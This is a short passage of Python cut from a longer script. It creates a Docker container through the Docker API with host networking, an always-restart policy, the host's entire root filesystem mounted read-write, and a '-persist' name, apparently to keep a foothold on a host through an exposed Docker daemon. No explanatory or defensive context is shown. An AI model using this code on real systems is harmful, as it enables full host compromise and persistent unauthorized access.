          sleep 2592000
          exit 0
          """.replace('__NONCE__', N)
          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
